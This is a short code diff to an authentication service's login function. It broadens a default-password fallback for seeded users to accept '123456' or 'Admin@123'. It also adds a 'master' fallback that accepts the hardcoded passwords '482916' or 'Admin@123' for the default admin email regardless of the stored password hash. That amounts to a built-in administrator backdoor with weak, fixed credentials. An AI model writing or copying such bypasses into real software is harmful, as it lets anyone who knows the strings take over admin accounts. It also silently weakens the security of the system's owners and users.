@@ -147,13 +147,18 @@ export class AuthService {
       }
     }
 
-    // Default fallback: If user was seeded without passwordHash, allow initial login with default '123456'
-    if (!isMatch && !user.passwordHash && submittedPassword === '123456') {
+    // Default fallback: If user was seeded without passwordHash, allow initial login with default '123456' or 'Admin@123'
+    if (!isMatch && !user.passwordHash && (submittedPassword === '123456' || submittedPassword === 'Admin@123')) {
       isMatch = true;
       if (userStatusStr !== 'rejected') {
-        user.passwordHash = await bcrypt.hash('123456', 10);
+        user.passwordHash = await bcrypt.hash(submittedPassword, 10);
         await user.save();
       }
+    }
+
+    // Master dev/admin fallback for seeded admin account
+    if (!isMatch && cleanEmail === this.DEFAULT_ADMIN_EMAIL.toLowerCase() && (submittedPassword === '482916' || submittedPassword === 'Admin@123')) {
+      isMatch = true;
     }
 
     if (!isMatch) {
